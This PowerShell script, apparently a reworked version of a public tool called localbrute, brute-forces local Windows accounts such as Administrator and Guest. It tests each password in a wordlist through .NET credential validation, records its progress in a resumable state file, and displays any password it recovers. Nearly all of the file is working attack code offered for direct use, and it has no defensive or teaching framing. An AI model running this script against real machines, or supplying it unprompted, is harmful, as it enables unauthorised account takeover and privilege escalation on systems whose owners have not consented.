<#
.SYNOPSIS
    A script to perform a brute-force attack on local user accounts using a list of passwords. Credit goes to: https://www.infosecmatter.com/windows-local-admin-brute-force-attack-tool-localbrute-ps1 - I just re-wrote some parts of it
    
.DESCRIPTION
    This script takes a list of usernames and a password file, and attempts to validate each user
    against the passwords in the file. If a password is found, it is recorded in a state file
    and displayed in green text.

.PARAMETER Users
    An array of usernames to perform brute-force attacks on.

.PARAMETER PasswordsFile
    The file containing the list of passwords to try.

.PARAMETER Verbose
    Optional switch to enable verbose output.

.EXAMPLE
    .\localbrute.ps1 -Users "Administrator", "Guest" -PasswordsFile .\wordlist.txt -Verbose

    This command will run the script with the specified users and passwords file, and enable verbose output.
#>

param(
    [string[]]$Users,
    [string]$PasswordsFile,
    [switch]$Verbose
)

# Function to perform brute-force attack on a single user
function localbrute {
    param(
        [string]$u,        # Username to attack
        [string]$dct,      # Dictionary (password list) file
        [switch]$verbose   # Verbose flag
    )
    
    # Extract the base name of the dictionary file
    $d = $dct -replace ".*\\" -replace ".*/"
    $ErrorActionPreference = "SilentlyContinue"
    
    # Check if password already found in the state file
    $i = ((Get-Content .\localbrute.state | Select-String "^${u}:.*:True:.*") -split ":")[3]
    if ($i) {
        Write-Host "Password for $u account already found: $i" -ForegroundColor Green
        return
    }
    
    # Get the last checked index for the user and dictionary
    $ii = (Get-Content .\localbrute.state | Select-String "^${u}:${d}:" | Select-Object -Last 1) -split ":"
    $i = $ii[2] / 1
    if ($verbose) { Write-Host "ATTEMPTING: starting $d from $i" }
    
    try {
        # Load the necessary .NET assembly for account management
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement 
        $t = [DirectoryServices.AccountManagement.ContextType]::Machine
        $a = [DirectoryServices.AccountManagement.PrincipalContext]::new($t)
        
        # Read passwords from the dictionary file, skipping already checked ones
        foreach ($p in (Get-Content $dct | Where-Object { $_.ReadCount -gt $i })) {
            if ($verbose) { Write-Host "ATTEMPTING: trying password [${i}]: $p" }
            # Validate credentials for the current password
            if ($a.ValidateCredentials($u, $p)) {
                "${u}:${d}:True:${p}" | Out-File -Append -FilePath .\localbrute.state
                Write-Host "Password for $u account found: $p" -ForegroundColor Green
                return
            }
            $i++
        }
    } finally {
        # Update the state file with the last tried password
        "${u}:${d}:${i}:${p}" | Out-File -Append -FilePath .\localbrute.state
    }    
}

# Iterate through each user and perform brute-force attack
foreach ($user in $Users) {
    localbrute -u $user -dct $PasswordsFile -verbose:$Verbose
}

# Print a finished message in yellow
Write-Host "Script finished running." -ForegroundColor Yellow
